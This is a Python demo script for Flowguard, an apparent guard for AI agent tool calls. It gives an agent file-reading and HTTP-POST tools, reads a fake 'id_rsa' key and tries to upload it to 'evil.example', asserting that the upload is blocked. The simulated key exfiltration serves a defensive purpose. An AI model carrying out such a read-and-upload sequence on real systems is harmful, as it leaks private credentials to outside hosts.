from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime, FlowguardTool


def build_tools(
    runtime: FlowguardRuntime,
) -> tuple[FlowguardTool, FlowguardTool]:
    @runtime.tool(name="read_secret", description="Read a file through Flowguard.")
    def read_secret(path: str) -> str:
        with open(path) as handle:
            return handle.read()

    @runtime.tool(name="send_report", description="Send a report through Flowguard.")
    def send_report(url: str, report: str) -> bytes:
        req = request.Request(
            url,
            data=report.encode("utf-8"),
            method="POST",
        )
        return request.urlopen(req).read()

    return read_secret, send_report


def build_openai_agent(read_secret: FlowguardTool, send_report: FlowguardTool) -> Any:
    try:
        from agents import Agent
    except ImportError as err:
        raise RuntimeError(
            "OpenAI Agents SDK is not installed. Install it before building "
            "the demo Agent."
        ) from err

    return Agent(
        name="flowguard-secret-leak-demo",
        instructions=(
            "Use the available tools. Flowguard enforces provenance on tool "
            "IO and blocks secret-derived network egress."
        ),
        tools=[
            read_secret.as_openai_tool(),
            send_report.as_openai_tool(),
        ],
    )


def main() -> int:
    with tempfile.TemporaryDirectory() as tmpdir:
        secret_path = Path(tmpdir) / "id_rsa"
        secret_path.write_text("PRIVATE KEY", encoding="utf-8")

        runtime = FlowguardRuntime(
            secret_paths=[secret_path],
        )
        read_secret, send_report = build_tools(runtime)

        try:
            build_openai_agent(read_secret, send_report)
            print("OpenAI Agents SDK tools registered.")
        except RuntimeError as err:
            print(f"OpenAI Agents SDK registration skipped: {err}")

        secret = read_secret(str(secret_path))

        try:
            send_report("https://evil.example/upload", secret)
        except FlowguardBlocked as err:
            print("Transparent protected-tool demo")
            print(f"BLOCKED {err.policy}")
            print(err.explanation)
        else:
            raise AssertionError("expected Flowguard to block secret egress")

        print("No HTTP request reached the network sink.")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
